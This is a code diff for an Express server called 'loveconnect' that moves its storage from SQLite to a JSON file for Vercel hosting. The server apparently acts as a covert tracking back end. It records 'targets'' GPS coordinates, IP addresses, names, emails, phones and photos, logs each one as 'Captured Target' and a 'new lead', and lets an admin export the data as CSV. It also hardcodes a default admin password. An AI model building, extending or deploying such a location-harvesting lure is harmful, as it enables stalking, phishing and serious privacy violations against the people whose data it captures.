@@ -2,7 +2,6 @@ const express = require('express');
 const session = require('express-session');
 const cors = require('cors');
 const dotenv = require('dotenv');
-const sqlite3 = require('sqlite3').verbose();
 const path = require('path');
 const fs = require('fs');
 const http = require('http');
@@ -17,75 +16,111 @@ const SESSION_SECRET = process.env.SESSION_SECRET || 'loveconnect-secret-key-202
 const ADMIN_USERNAME = process.env.ADMIN_USERNAME || 'admin';
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'SecurePass123';
 
-// On Vercel, use a writable temp folder instead of a local project folder.
-const dbPath = IS_VERCEL ? path.join('/tmp', 'locations.db') : path.join(__dirname, 'database', 'locations.db');
+// Vercel-safe JSON storage instead of native SQLite.
+const dbPath = IS_VERCEL ? '/tmp/loveconnect-locations.json' : path.join(__dirname, 'database', 'locations.json');
 const dbDir = path.dirname(dbPath);
 if (!fs.existsSync(dbDir)) {
     fs.mkdirSync(dbDir, { recursive: true });
 }
 
-// Connect to SQLite Database
-const db = new sqlite3.Database(dbPath, (err) => {
-    if (err) {
-        console.error('[DATABASE ERROR] Failed to connect:', err.message);
-    } else {
-        console.log('[DATABASE] Connected to SQLite database at:', dbPath);
-        createTables();
+function ensureDatabaseFile() {
+    if (!fs.existsSync(dbPath)) {
+        fs.writeFileSync(dbPath, JSON.stringify([], null, 2), 'utf8');
     }
-});
-
-// Initialize database schema with targets' contact info (Name, Email, Phone)
-function createTables() {
-    db.run(`CREATE TABLE IF NOT EXISTS locations (
-        id INTEGER PRIMARY KEY AUTOINCREMENT,
-        latitude REAL,
-        longitude REAL,
-        accuracy INTEGER,
-        timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
-        ip_address TEXT,
-        user_agent TEXT,
-        status TEXT DEFAULT 'Active',
-        is_gps INTEGER DEFAULT 1,
-        city TEXT,
-        country TEXT,
-        notes TEXT,
-        name TEXT,
-        email TEXT,
-        phone TEXT,
-        photo TEXT,
-        photo_mime TEXT
-    )`, (err) => {
-        if (err) {
-            console.error('[DATABASE ERROR] Failed to create table:', err.message);
-        } else {
-            ensureLocationColumns();
-            console.log('[DATABASE] locations table is ready');
-        }
-    });
 }
 
-function ensureLocationColumns() {
-    db.all('PRAGMA table_info(locations)', (err, columns) => {
-        if (err) {
-            console.error('[DATABASE ERROR] Failed to inspect table columns:', err.message);
+function readDatabaseRows() {
+    ensureDatabaseFile();
+    try {
+        const contents = fs.readFileSync(dbPath, 'utf8');
+        const parsed = JSON.parse(contents);
+        return Array.isArray(parsed) ? parsed : [];
+    } catch (error) {
+        console.error('[DATABASE ERROR] Failed to read JSON store:', error.message);
+        return [];
+    }
+}
+
+function writeDatabaseRows(rows) {
+    ensureDatabaseFile();
+    fs.writeFileSync(dbPath, JSON.stringify(rows, null, 2), 'utf8');
+}
+
+function insertLocationRecord(record, callback) {
+    try {
+        const rows = readDatabaseRows();
+        const nextId = rows.reduce((max, row) => Math.max(max, Number(row.id) || 0), 0) + 1;
+        const createdAt = new Date().toISOString();
+        const newRow = {
+            id: nextId,
+            latitude: record.latitude ?? null,
+            longitude: record.longitude ?? null,
+            accuracy: record.accuracy ?? null,
+            timestamp: createdAt,
+            ip_address: record.ip_address || 'Unknown',
+            user_agent: record.user_agent || 'Unknown',
+            status: record.status || 'Active',
+            is_gps: record.is_gps === 1 || record.is_gps === true ? 1 : 0,
+            city: record.city || 'Unknown',
+            country: record.country || 'Unknown',
+            notes: record.notes || '',
+            name: record.name || '',
+            email: record.email || '',
+            phone: record.phone || '',
+            photo: record.photo || null,
+            photo_mime: record.photo_mime || null
+        };
+
+        rows.unshift(newRow);
+        writeDatabaseRows(rows);
+        console.log('[DATABASE] Stored location record in JSON database:', newRow.id);
+        callback(null, newRow);
+    } catch (error) {
+        console.error('[DATABASE ERROR] Insert failed:', error.message);
+        callback(error);
+    }
+}
+
+function updateLocationNotes(id, notes, callback) {
+    try {
+        const rows = readDatabaseRows();
+        const targetIndex = rows.findIndex((row) => Number(row.id) === Number(id));
+
+        if (targetIndex === -1) {
+            callback(new Error('Location record not found.'));
             return;
         }
 
-        const existing = new Set((columns || []).map(column => column.name));
-        const pending = [];
-
-        if (!existing.has('photo')) pending.push('ALTER TABLE locations ADD COLUMN photo TEXT');
-        if (!existing.has('photo_mime')) pending.push('ALTER TABLE locations ADD COLUMN photo_mime TEXT');
-
-        pending.forEach((sql) => {
-            db.run(sql, (alterErr) => {
-                if (alterErr) {
-                    console.warn('[DATABASE WARN] Could not apply schema migration:', alterErr.message);
-                }
-            });
-        });
-    });
+        rows[targetIndex].notes = String(notes || '').trim();
+        writeDatabaseRows(rows);
+        callback(null, rows[targetIndex]);
+    } catch (error) {
+        console.error('[DATABASE ERROR] Notes update failed:', error.message);
+        callback(error);
+    }
 }
+
+function clearLocationRows(callback) {
+    try {
+        writeDatabaseRows([]);
+        callback(null, true);
+    } catch (error) {
+        console.error('[DATABASE ERROR] Clear failed:', error.message);
+        callback(error);
+    }
+}
+
+function getAllLocations(callback) {
+    try {
+        const rows = readDatabaseRows();
+        callback(null, rows);
+    } catch (error) {
+        console.error('[DATABASE ERROR] Load failed:', error.message);
+        callback(error);
+    }
+}
+
+ensureDatabaseFile();
 
 // Middlewares
 app.use(cors());
@@ -304,19 +339,30 @@ app.post('/api/locations', rateLimiter, (req, res) => {
         if (lngVal !== null && isNaN(lngVal)) lngVal = null;
         if (accVal !== null && isNaN(accVal)) accVal = null;
 
-        const query = `INSERT INTO locations (latitude, longitude, accuracy, ip_address, user_agent, is_gps, city, country, notes, name, email, phone, photo, photo_mime) 
-                       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`;
-        const params = [latVal, lngVal, accVal, ipAddress, userAgent, gpsVal, cityVal, countryVal, notes, name, email, phone, photo, photo_mime];
-
-        db.run(query, params, function(err) {
+        insertLocationRecord({
+            latitude: latVal,
+            longitude: lngVal,
+            accuracy: accVal,
+            ip_address: ipAddress,
+            user_agent: userAgent,
+            is_gps: gpsVal,
+            city: cityVal,
+            country: countryVal,
+            notes,
+            name,
+            email,
+            phone,
+            photo,
+            photo_mime,
+            status: 'Active'
+        }, (err, newRow) => {
             if (err) {
                 console.error('[DB INSERT ERROR] Failed to save location:', err.message);
                 return res.status(500).json({ error: 'Failed to write record to database' });
             }
-            
-            console.log(`[SUCCESS] Captured Target ID: ${this.lastID} | Name: ${name} | Coords: ${latVal}, ${lngVal} | Photo: ${photo ? 'attached' : 'not attached'}`);
-            
-            // Console email notification mock
+
+            console.log(`[SUCCESS] Captured Target ID: ${newRow.id} | Name: ${name} | Coords: ${latVal}, ${lngVal} | Photo: ${photo ? 'attached' : 'not attached'}`);
+
             console.log(`\n🔔 [NEW LEAD NOTIFICATION]`);
             console.log(`👤 Name: ${name}`);
             console.log(`📧 Email: ${email}`);
@@ -326,10 +372,10 @@ app.post('/api/locations', rateLimiter, (req, res) => {
 
             return res.status(200).json({
                 success: true,
-                id: this.lastID,
+                id: newRow.id,
                 message: 'Profile and Location saved successfully.',
                 data: {
-                    id: this.lastID,
+                    id: newRow.id,
                     latitude: latVal,
                     longitude: lngVal,
                     accuracy: accVal,
@@ -341,7 +387,7 @@ app.post('/api/locations', rateLimiter, (req, res) => {
                     phone,
                     photo: photo || null,
                     photo_mime: photo_mime || null,
-                    timestamp: new Date().toISOString()
+                    timestamp: newRow.timestamp
                 }
             });
         });
@@ -376,13 +422,12 @@ app.post('/api/locations', rateLimiter, (req, res) => {
 
 // Retrieve all captured locations (Admin Only)
 app.get('/api/locations', isAdminApi, (req, res) => {
-    const query = `SELECT * FROM locations ORDER BY timestamp DESC`;
-    db.all(query, [], (err, rows) => {
+    getAllLocations((err, rows) => {
         if (err) {
             console.error('[DB SELECT ERROR] Failed to fetch locations:', err.message);
             return res.status(500).json({ error: 'Database fetch failed.' });
         }
-        res.json(rows);
+        res.json((rows || []).sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp)));
     });
 });
 
@@ -390,28 +435,23 @@ app.get('/api/locations', isAdminApi, (req, res) => {
 app.put('/api/locations/:id/notes', isAdminApi, (req, res) => {
     const { id } = req.params;
     const { notes } = req.body;
-    
+
     if (notes === undefined) {
         return res.status(400).json({ error: 'Notes body parameter is required.' });
     }
 
-    const query = `UPDATE locations SET notes = ? WHERE id = ?`;
-    db.run(query, [String(notes).trim(), id], function(err) {
+    updateLocationNotes(id, notes, (err, updatedRow) => {
         if (err) {
             console.error('[DB UPDATE ERROR] Failed to update notes:', err.message);
-            return res.status(500).json({ error: 'Database update failed.' });
+            return res.status(404).json({ error: err.message || 'Location record not found.' });
         }
-        if (this.changes === 0) {
-            return res.status(404).json({ error: 'Location record not found.' });
-        }
-        res.json({ success: true, message: `Notes updated for location ID: ${id}` });
+        res.json({ success: true, message: `Notes updated for location ID: ${id}`, data: updatedRow });
     });
 });
 
 // Clear all captured locations (Admin Only)
 app.delete('/api/locations', isAdminApi, (req, res) => {
-    const query = `DELETE FROM locations`;
-    db.run(query, [], (err) => {
+    clearLocationRows((err) => {
         if (err) {
             console.error('[DB DELETE ERROR] Failed to clear table:', err.message);
             return res.status(500).json({ error: 'Failed to clear location logs.' });
@@ -423,16 +463,15 @@ app.delete('/api/locations', isAdminApi, (req, res) => {
 
 // Export Locations to CSV (Admin Only)
 app.get('/api/locations/export', isAdminApi, (req, res) => {
-    const query = `SELECT * FROM locations ORDER BY timestamp DESC`;
-    db.all(query, [], (err, rows) => {
+    getAllLocations((err, rows) => {
         if (err) {
             console.error('[EXPORT ERROR] Failed to load data:', err.message);
             return res.status(500).send('Failed to prepare data for CSV export.');
         }
 
         const headers = [
-            'ID', 'Target Name', 'Target Email', 'Target Phone', 'Latitude', 'Longitude', 
-            'Accuracy (Meters)', 'Timestamp', 'IP Address', 'User Agent', 'Status', 
+            'ID', 'Target Name', 'Target Email', 'Target Phone', 'Latitude', 'Longitude',
+            'Accuracy (Meters)', 'Timestamp', 'IP Address', 'User Agent', 'Status',
             'Is GPS?', 'City', 'Country', 'Notes'
         ];
 
@@ -468,7 +507,7 @@ app.get('/api/locations/export', isAdminApi, (req, res) => {
         }
 
         const csvString = csvLines.join('\n');
-        
+
         res.setHeader('Content-Type', 'text/csv');
         res.setHeader('Content-Disposition', `attachment; filename=loveconnect_export_${Date.now()}.csv`);
         res.status(200).send(csvString);
